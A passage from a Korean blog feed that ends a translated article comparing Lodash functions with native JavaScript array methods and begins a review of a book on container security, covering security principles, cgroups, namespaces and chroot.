프로그래밍</strong>으로 설명할 수 있습니다. 여기에서, <strong>함수형 프로그래밍</strong>이란 무엇일까요?</p> <p>함수형 프로그래밍을 설명하는데는 여러 방법이 있지만, 다음과 같이 정의해볼 수 있습니다.</p> <blockquote> <p>함수형 프로그래밍은 <strong>계산을 수학적 함수의 조합으로 생각하는 방식</strong>을 의미합니다. 프로그래밍이 실행될 때 전역 상태를 변경하는 명령문으로 구성된 <strong>명령형 프로그래밍과 대조되는 개념</strong>으로 이해할 수 있습니다. 명령형 프로그래밍에서는 일반적인 프로그래밍 언어에서 함수가 특정 동작을 수행하는 역할을 담당하지만, 함수형 프로그래밍에서는 일반적으로 전역 변수와 같은 변경 가능한(mutable) 상태의 사용을 피하고, <strong>불변(immutable) 데이터</strong>와 <strong>side effect이 없는 함수</strong>, 즉 함수의 실행이 외부에 영향을 끼치지 않는 함수를 사용하는 것을 지향합니다.</p> </blockquote> <p>여기서 중요한 것은, 사이드 이펙트가 없어야 한다는 점이며 이는 함수 내부에 상태가 존재하지 않고 함수의 출력 값은 항상 함수의 입력 값의 영향만 받는다는 것을 의미합니다. 덕분에 테스트, 유지 관리가 쉽고 무엇보다도 예측 가능합니다.</p> <h2 id="예제">예제</h2> <p>간단한 예제와 함께 순수 자바스크립트 함수와 라이브러리 함수를 좀 더 자세히 비교해보겠습니다.</p> <blockquote> <p>TIP: 필요한 기능만 Bit 컴포넌트로 설치해주세요</p> </blockquote> <p><a href="https://github.com/teambit/bit">Bit</a> 을 사용하면 라이브러리의 함수, 컴포넌트, 모듈을 별도의 리팩토링 없이 재사용 가능하게 나눌 수 있습니다. Lodash에 대한 내용은 <a href="https://bit.dev/lodash/lodash">여기</a> 를 참고해주세요!</p> <h3 id="find">find</h3> <p>첫 번째로 <code class="language-plaintext highlighter-rouge">find</code>을 살펴보겠습니다. <code class="language-plaintext highlighter-rouge">find</code>는 컬렉션에서 주어진 조건을 충족하는 첫 번째 요소를 반환합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">users</span> <span class="o">=</span> <span class="p">[</span>
<span class="p">{</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">joey</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">age</span><span class="dl">'</span><span class="p">:</span> <span class="mi">32</span> <span class="p">},</span>
<span class="p">{</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">ross</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">age</span><span class="dl">'</span><span class="p">:</span> <span class="mi">41</span> <span class="p">},</span>
<span class="p">{</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">:</span> <span class="dl">'</span><span class="s1">chandler</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">age</span><span class="dl">'</span><span class="p">:</span> <span class="mi">39</span> <span class="p">}</span>
<span class="p">]</span>

<span class="c1">// Native</span>
<span class="nx">users</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="nf">function </span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">o</span><span class="p">.</span><span class="nx">age</span> <span class="o">&lt;</span> <span class="mi">40</span><span class="p">;</span> <span class="p">})</span>

<span class="c1">//lodash</span>
<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="nx">users</span><span class="p">,</span> <span class="nf">function </span><span class="p">(</span><span class="nx">o</span><span class="p">)</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">o</span><span class="p">.</span><span class="nx">age</span> <span class="o">&lt;</span> <span class="mi">40</span><span class="p">;</span> <span class="p">})</span>
</pre></td></tr></tbody></table></code></pre></figure> <p>위의 간단한 예제 코드를 통해, 네이티브 자바스크립트와 Lodash 각각의 성능을 살펴보겠습니다.</p> <blockquote> <p>_find vs _.find _</p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*aw5pv3HKxsHsV1jh434UYg.png" alt="queue" width="100%" height="100%"/></p> <p>하지만, 이 통계만 보고 순수 자바스크립트의 기능이 항상 Lodash의 것보다 성능이 좋다는 결론을 내릴 순 없습니다. 다만, 네이티브 함수인 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/find">find</a> 이 lodash의 <a href="https://lodash.com/docs/4.17.15#find">find</a> 보다 더 간결하고 읽기 쉽다는 장점이 있음은 분명해보입니다.</p> <h3 id="filter">filter</h3> <p>다음으로 <code class="language-plaintext highlighter-rouge">filter</code> 를 살펴보겠습니다. <code class="language-plaintext highlighter-rouge">filter</code>는 컬렉션에서 특정 조건을 충족하는 요소를 반환하는데 주로 사용됩니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">numbers</span> <span class="o">=</span> <span class="p">[</span><span class="mi">10</span><span class="p">,</span> <span class="mi">40</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">15</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">51</span><span class="p">,</span> <span class="mi">1221</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nx">numbers</span><span class="p">,</span> <span class="nx">num</span> <span class="o">=&gt;</span> <span class="nx">num</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span>
<span class="nx">numbers</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nx">num</span> <span class="o">=&gt;</span> <span class="nx">num</span> <span class="o">%</span> <span class="mi">3</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>_.filter vs array.filter</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*lstVPT2qm3OesKxOm3OoGg.png" alt="queue" width="100%" height="100%"/></p> <p>이번에도 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/filter"><code class="language-plaintext highlighter-rouge">Array.prototype.filter</code></a>가 동일 연산을 처리하는데 좀 더 빠르다는 결과를 얻을 수 있습니다.</p> <h3 id="each">each</h3> <p>반대로 lodash 함수를 사용할 때 유익한 경우도 있습니다. 아래 예제는 내장된 이터레이터인 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/forEach">Array.prototype.forEach</a> 보다 lodash의 <a href="https://lodash.com/docs/4.17.15#forEach">_.forEach</a> 를 사용하는 것이 좋음을 보여주고 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="code"><pre><span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">each</span><span class="p">([</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span> <span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">index</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span>
<span class="p">})</span>

<span class="p">[</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">].</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">value</span><span class="p">,</span> <span class="nx">index</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span>
<span class="p">})</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">forEach</span><span class="p">({</span> <span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">:</span> <span class="mi">2</span> <span class="p">},</span> <span class="p">(</span><span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
<span class="p">});</span>

<span class="p">({</span> <span class="dl">'</span><span class="s1">a</span><span class="dl">'</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="dl">'</span><span class="s1">b</span><span class="dl">'</span><span class="p">:</span> <span class="mi">2</span> <span class="p">}).</span><span class="nf">forEach</span><span class="p">((</span><span class="nx">value</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="c1">// !error</span>
<span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">key</span><span class="p">);</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>_.each vs forEach vs map</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*sqlnG7flP2igrYUnt7YSzA.png" alt="queue" width="100%" height="100%"/></p> <p><code class="language-plaintext highlighter-rouge">_.each</code>는 브라우저 별로 구현을 달리 하기 때문에 네이티브 함수보다 훨씬 빠른 결과를 얻을 수 있습니다.</p> <blockquote> <p>Lodash 개발자에 따르면, 네이티브 forEach 함수는 브라우저에 따라 상대적인 속도가 상이하다고 합니다. 이는 forEach가 네이티브 함수이기 때문에 <code class="language-plaintext highlighter-rouge">for</code> 혹은 <code class="language-plaintext highlighter-rouge">while</code>로 생성된 루프보다 빠르다는 것을 의미하지 않습니다. 또한 forEach는 콜백 함수를 사용하기 때문에, 함수 호출 시 (잠재적인) 오버헤드가 존재합니다.</p> </blockquote> <h3 id="every">every</h3> <p><code class="language-plaintext highlighter-rouge">every</code>는 배열의 모든 요소를 순회하며 특정 조건을 충족하는지 여부를 테스트합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">elements</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">cat</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">dog</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">bat</span><span class="dl">"</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">every</span><span class="p">(</span><span class="nx">elements</span><span class="p">,</span> <span class="nx">el</span> <span class="o">=&gt;</span> <span class="nx">el</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span>
<span class="nx">elements</span><span class="p">.</span><span class="nf">every</span><span class="p">(</span><span class="nx">el</span> <span class="o">=&gt;</span> <span class="nx">el</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">3</span><span class="p">)</span> <span class="c1">//true</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>_.every vs array.every</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*_CJMbz8wzHiv6R2SP7h9Gw.png" alt="queue" width="100%" height="100%"/></p> <p>이번에도 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/every">Array.prototype.every</a> 가 <code class="language-plaintext highlighter-rouge">_.every</code>보다 훨씬 빠르다는 결과를 얻었습니다.</p> <h3 id="some">some</h3> <p><code class="language-plaintext highlighter-rouge">some</code>은 배열의 요소 중 하나 이상이 특정 조건을 충족하는지 여부를 확인하는데 사용합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">elements</span> <span class="o">=</span> <span class="p">[</span><span class="dl">"</span><span class="s2">cat</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">dog</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">bat</span><span class="dl">"</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">some</span><span class="p">(</span><span class="nx">elements</span><span class="p">,</span> <span class="nx">el</span> <span class="o">=&gt;</span> <span class="nx">el</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">'</span><span class="s1">c</span><span class="dl">'</span><span class="p">))</span>
<span class="nx">elements</span><span class="p">.</span><span class="nf">some</span><span class="p">(</span><span class="nx">el</span> <span class="o">=&gt;</span> <span class="nx">el</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">'</span><span class="s1">c</span><span class="dl">'</span><span class="p">))</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>array.some vs _.some</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*EBznqoWTqNjrARQE_yJpTw.png" alt="queue" width="100%" height="100%"/></p> <p><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/some">Array.prototype.some</a> 의 결과가 우세함을 알 수 있습니다.</p> <h3 id="includes">includes</h3> <p><code class="language-plaintext highlighter-rouge">includes</code>는 배열에 특정 요소가 포함되어 있는지 여부를 반환합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">const</span> <span class="nx">primes</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">31</span><span class="p">,</span><span class="mi">37</span><span class="p">,</span><span class="mi">41</span><span class="p">,</span><span class="mi">43</span><span class="p">,</span><span class="mi">47</span><span class="p">,</span><span class="mi">53</span><span class="p">,</span><span class="mi">59</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">67</span><span class="p">,</span><span class="mi">71</span><span class="p">,</span><span class="mi">73</span><span class="p">,</span><span class="mi">79</span><span class="p">,</span><span class="mi">83</span><span class="p">,</span><span class="mi">97</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">primes</span><span class="p">,</span> <span class="mi">47</span><span class="p">)</span>
<span class="nx">primes</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="mi">79</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>array.includes vs _.includes</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*WW2NTx8Ka4PKul6gPPvOuQ.png" alt="queue" width="100%" height="100%"/></p> <h3 id="uniq">uniq</h3> <p><code class="language-plaintext highlighter-rouge">uniq</code>는 배열에서 고유한 요소를 찾는데 사용됩니다. 자바스크립트의 <code class="language-plaintext highlighter-rouge">Set</code> 데이터 타입을 활용하여 배열을 집합으로 변환하고, 스프레드 연산자(…)를 사용하여 이를 다시 배열로 변환합니다. 이러한 두 번의 전환 과정을 거치는 것이 실제로 도움이 되는지 살펴봅시다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="kd">var</span> <span class="nx">elements</span> <span class="o">=</span> <span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">uniq</span><span class="p">(</span><span class="nx">elements</span><span class="p">)</span>
<span class="p">[...</span><span class="k">new</span> <span class="nc">Set</span><span class="p">(</span><span class="nx">elements</span><span class="p">)]</span>
</pre></td></tr></tbody></table></code></pre></figure> <blockquote> <p><em>_.uniq vs Set</em></p> </blockquote> <p><img src="https://miro.medium.com/max/1400/1*GOx7k9e6DFast8jPSmPKpQ.png" alt="queue" width="100%" height="100%"/></p> <p><code class="language-plaintext highlighter-rouge">_.uniq</code>의 성능이 조금 더 우세함을 확인할 수 있습니다.</p> <p>또는 아래와 같은 방식도 고려해볼 수 있습니다.</p> <div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">elements</span><span class="p">.</span><span class="nf">filter</span><span class="p">((</span><span class="nx">value</span><span class="p">,</span> <span class="nx">index</span><span class="p">,</span> <span class="nx">array</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">array</span><span class="p">.</span><span class="nf">indexof</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="o">===</span> <span class="nx">index</span><span class="p">);</span>
</code></pre></div></div> <h3 id="compact">compact</h3> <p><code class="language-plaintext highlighter-rouge">compact</code>는 배열에서 거짓(false) 혹은 정의되지 않은(undefined) 값을 제거하는데 유용합니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre><span class="kd">var</span> <span class="nx">array</span> <span class="o">=</span> <span class="p">[</span><span class="kc">undefined</span><span class="p">,</span> <span class="dl">'</span><span class="s1">cat</span><span class="dl">'</span><span class="p">,</span> <span class="kc">false</span><span class="p">,</span> <span class="mi">434</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="mf">32.0</span><span class="p">]</span>

<span class="err">\</span><span class="nx">_</span><span class="p">.</span><span class="nf">compact</span><span class="p">(</span><span class="nx">array</span><span class="p">)</span>
<span class="nx">array</span><span class="p">.</span><span class="nf">filter</span><span class="p">(</span><span class="nb">Boolean</span><span class="p">)</span>
<span class="c1">// same as writing: (a.k.a Syntactic sugar)</span>
<span class="c1">// array.filter(function (x) { return Boolean(x); });</span>
</pre></td></tr></tbody></table></code></pre></figure> <hr/> <p>지금까지 여러 예제들을 통해 네이티브 함수의 유용성을 살펴보았습니다. Lodash 등의 유틸리티 라이브러리 대신 네이티브 함수를 선택할 때 고려해야 할 사항은 다음과 같습니다.</p> <ul> <li>반드시 필요한 모듈만 <code class="language-plaintext highlighter-rouge">import</code>합니다.</li> <li>lodash의 경우 CommonJS 형태로 번들링되어 배포되기 때문에 webpack의 기본 설정으로는 lodash를 <a href="https://webpack.js.org/guides/tree-shaking/">트리 쉐이킹</a> 할 수 없다. 이 경우, <a href="https://github.com/lodash/babel-plugin-lodash">babel-plugin-lodash</a> 를 사용하길 추천합니다.</li> <li>프로젝트에 더 적은 종속성이 요구되거나 대상 브라우저를 명확하게 알고 있다면, lodash/underscore.js와 같은 외부 유틸을 지양하고 네이티브 함수를 사용합니다.</li> </ul> <hr/> <p>🔗 참조</p> <p>📌 <a href="https://blog.bitsrc.io/you-dont-need-lodash-or-how-i-started-loving-javascript-functions-3f45791fa6cd">Pure JavaScript Functions as a Replacement for Lodash</a></p> <p>📌 <a href="https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore">You Dont Need Lodash Underscore</a></p>]]></content><author><name></name></author><category term="글또"/><category term="JavaScript"/><category term="lodash"/><category term="vanillaJavaScript"/><summary type="html"><![CDATA[이 글은 원저자 RC 의 허락을 받아 Pure JavaScript Functions as a Replacement for Lodash 을 번역한 글입니다]]></summary></entry><entry><title type="html">[리뷰] “컨테이너 보안”을 읽고</title><link href="https://chanmi-lee.github.io/articles/2021-02/review-of-container-security/" rel="alternate" type="text/html" title="[리뷰] “컨테이너 보안”을 읽고"/><published>2021-02-07T00:00:00+00:00</published><updated>2021-02-07T00:00:00+00:00</updated><id>https://chanmi-lee.github.io/articles/2021-02/review-of-container-security</id><content type="html" xml:base="https://chanmi-lee.github.io/articles/2021-02/review-of-container-security/"><![CDATA[<blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> "한빛미디어 &lt;나는 리뷰어다&gt; 활동으로, 책을 제공받아 작성된 서평입니다."
</code></pre></div> </div> </blockquote> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/docker-container-480.webp 480w,/assets/img/posts/docker-container-800.webp 800w,/assets/img/posts/docker-container-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/docker-container.png" class="img-fluid rounded z-depth-1" width="50%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <h3 id="컨테이너-보안">컨테이너 보안</h3> <p>가벼움과 재사용 가능한 코드, 그리고 무엇보다 2013년 도커의 등장 이래로 <code class="language-plaintext highlighter-rouge">컨테이너</code>에 대한 관심이 증가하고 있습니다. 컨테이너는 격리된 공간에서 프로세스가 동작하는 기술로, 도커의 초기 광고 문구인 <code class="language-plaintext highlighter-rouge">Build Once Run Anywhere</code> 처럼, 한 번만 빌드하고 어디서든 실행할 수 있게 해줍니다. 컨테이너를 이용하면 간단한 한 두개의 명령어를 통해 다종다양한 실행 환경에서 우려되는 각종 오류와 지원 문제를 해결해준다는 점에서도 크나큰 매력이 있습니다.</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/posts/container-security-cover-480.webp 480w,/assets/img/posts/container-security-cover-800.webp 800w,/assets/img/posts/container-security-cover-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/posts/container-security-cover.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>이 책은 컨테이너 기반 시스템을 구성하는데 쓰이는 여러 기반 기술들과 매커니즘을 소개하고, 리눅스 운영체제에서 구체적으로 어떻게 작용하는지 설명하고 있습니다. 전반부는 시스템 호출과 리눅스 능력 등 컨테이너와 관련된 리눅스 메커니즘을 설명하면서, 컨테이너가 어떻게 작동하고 컨테이너의 구성 요소들이 어떻게 서로 혹은 외부와 통신하는지 다루고 있습니다. 또한 컨테이너 이미지를 안전하게 구축하는 best practice를 사례와 함께 설명하고, 기본 구현 이상으로 컨테이너 보안을 강화하는데 사용할 수 있는 추가적인 리눅스 보안 수단들을 설명해주고 있습니다.</p> <p>이어지는 후반부에서는, 컨테이너간의 통신 방식과 연결에 제한을 두어 보안을 개선하는 방법을 살펴보고 있습니다. 컨테이너화된 구성 요소들이 서로를 식별하고 보안 네트워크 연결을 설정하는데 사용되는 개인 키/공개 키 방식과 인증서를 사례로 알아보고, 마지막으로 컨테이너의 기능을 활용해 공격을 방지하는 여러 보안 도구들을 소개하고 있습니다.</p> <h4 id="일반적인-보안-원칙들">일반적인 보안 원칙들</h4> <ul> <li>최소 권한</li> </ul> <p>최소 권한 원칙 또는 최소 특권 원칙은 사용자 또는 구성 요소가 해당 작업을 진행하는데 <code class="language-plaintext highlighter-rouge">반드시 필요한 것에만 접근</code>할 수 있게 해야 한다는 것을 의미합니다. 예를 들어, 특정 컨테이너에게 루트 사용자 권한으로 실행되도록 설정한다면 실제로 필요한 것보다 더 많은 특권을 가지게 됩니다. 전자 상거래 프로그램 내에 상품을 검색하는 마이크로 서비스가 있다고 할 때, 최소 권한 원칙에 따르면 제품과 관련된 데이터베이스에 읽기 전용으로만 접근할 수 있는 권한만 부여되어야 합니다. 이 때엔 사용자 정보 혹은 결제 정보 등 이와 직접적인 관련이 없는 것에 대한 권한은 필요하지 않습니다.</p> <ul> <li>심층 방어</li> </ul> <p>심층 방어 원칙이란 보호를 여러 층으로 적용해야 함을 의미합니다. 공격자가 방어층 하나를 뚫는다고 해도 또 다른 방어층이 있으면 그 목적을 쉽게 달성하지 못하도록 방어할 수 있으며, 이중 로그인을 예로 들 수 있습니다.</p> <ul> <li>공격 표면 축소</li> </ul> <p>일반적으로 시스템이 복잡할수록 이를 공격하는 방법이 다양해지기 때문에, 시스템의 복잡도를 줄여 보안력을 높이는 것을 의미합니다. 서버에 접근 가능한 사용자들과 구성 요소를 제한하거나, 인터페이스를 최대한 작고 단순하게 구성하는 등의 방법이 있습니다.</p> <ul> <li>폭발 반경 제한</li> </ul> <p>보안 통제 항복들을 더 작은 부분으로 나누어 혹시 모를 사건 발생에 대한 상호영향도를 최소화 하는 것을 의미합니다.</p> <ul> <li>직무 분리 (Segregation of duties, SoD)</li> </ul> <p>서로 다른 구성 요소나 사용자들에게 전체 시스템 중 꼭 필요한 가장 작은 부분집합에 대한 권한만을 부여하는 것을 의미합니다. 앞에서 설명한 최소 권한 및 폭발 반경 제한 원칙과 관련이 있습니다.</p> <h4 id="cgroups로-제한하기">cgroups로 제한하기</h4> <p>리눅스의 모든 프로세스는 일반적으로 하나의 부모 프로세스의 하위 프로세스입니다 (<code class="language-plaintext highlighter-rouge">부모-자식 관계</code> 라고도 이해할 수 있습니다).</p> <p>따라서 한 프로세스가 처음 생성될 때 (<code class="language-plaintext highlighter-rouge">init</code>), 생성된 프로세스는 다음의 특징을 가지게 됩니다.</p> <ul> <li>계층적이다</li> <li>자식 cgroups은 부모 cgroups의 속성을 상속한다</li> </ul> <p>일반적으로 컨테이너는 리눅스 프로세스로 실행되므로, <code class="language-plaintext highlighter-rouge">cgroups</code>를 통해 각 칸테이너가 사용할 수 있는 자원들을 제한할 수 있습니다. <code class="language-plaintext highlighter-rouge">cgroups</code>는 <code class="language-plaintext highlighter-rouge">control groups</code>를 줄인 말로, 주어진 그룹에 속한 프로세스들이 사용할 수 있는 자원(메모리나 CPU, 네트워크 입출력)을 제한하는 수단입니다.</p> <p>제어 그룹을 관리한다는 것은, 결국 이 위계구조들에 있는 파일들과 디렉터리를 읽고 쓰는 것을 의미합니다.</p> <h4 id="namespace로-제한하기">namespace로 제한하기</h4> <p><code class="language-plaintext highlighter-rouge">cgroups</code>가 프로세스가 사용할 수 있는 자원을 제한한다면, <code class="language-plaintext highlighter-rouge">namespace</code>는 프로세스가 볼 수 있는 것들을 제한합니다.</p> <p>리눅스에서 지원하는 namespace의 종류는 다음과 같습니다.</p> <ul> <li>유닉스 시분할 시스템 (Unix Timesharing System, UTS) : 프로세스가 인식하는 시스템의 호스트 이름과 도메인 이름들에 관한 namespace</li> <li>프로세스 ID</li> <li>마운트 지점 (Mount point)</li> <li>네트워크</li> <li>사용자 ID와 그룹 ID</li> <li>IPC (Inter-process communication, 프로세스간 통신)</li> <li>제어 그룹</li> </ul> <p>하나의 프로세스는 namespace 종류 당 하나의 namespace에 속하게 됩니다. 프로세스를 어떤 namespace에 넣으면, 프로세스는 해당 namespace이 허용하는 것들만 볼 수 있게 됩니다.</p> <blockquote> <p>lsns: 현존하는 namespace를 확인하기 위해 사용하는 명령어</p> </blockquote> <p>도커 컨테이너 안에서 <code class="language-plaintext highlighter-rouge">ps</code> 명령어를 실행하면 현재 컨테이너 안에서 실행되는 프로세스만 나오고 호스트에서 실행되는 프로세스들은 나오지 않습니다. 이처럼 컨테이너가 볼 수 있는 프로세스 ID들이 제한된 것은 컨테이너마다 개별적인 프로세스 ID namespace를 적용했기 때문입니다.</p> <p>또한 컨테이너 실행 시 루트 디렉터리가 변경되어, 호스트의 파일 시스템 전체를 볼 수 없습니다. 만약 루트 디렉터리를 변경하려면 <code class="language-plaintext highlighter-rouge">chroot</code> 명령어를 통해 변경할 수 있습니다.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; mkdir new_root
&gt; sudo chroot new_root
</code></pre></div></div> <p>이 외에도 각각의 namespace별로 제한하는 방법을 사례와 함께 제시해주고 있어, 실무에서 도커를 활용하여 직접 컨테이너 환경을 구축하고 이를 감싸는 보안 경계를 강화하고자 할 때 참고할 수 있습니다.</p> <h4 id="컨테이너-이미지와-보안">컨테이너 이미지와 보안</h4> <p>이미지는 <code class="language-plaintext highlighter-rouge">컨테이너 실행에 필요한 파일과 설정 값</code> 등을 포함하고 있는 것으로, 상태값을 가지지 않고 변하지 않습니다. (<code class="language-plaintext highlighter-rouge">Immutable</code>) 하나의 컨테이너 이미지는 크게 두 부분으로 구성됩니다. 하나는 <code class="language-plaintext highlighter-rouge">루트 파일 시스템</code>이고, 다른 하나는 <code class="language-plaintext highlighter-rouge">이미지 설정 정보</code>입니다. 아래는 실제 컨테이너 이미지의 config.json 파일로, 여기에 컨테이너 프로세스의 접근을 제한할 자원들과 프로세스별마다 적용되는 namespace를 비롯한 컨테이너와 관련된 설정을 포함하고 있습니다.</p> <figure class="highlight"><pre><code class="language-javascript" data-lang="javascript"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="code"><pre><span class="p">...</span>
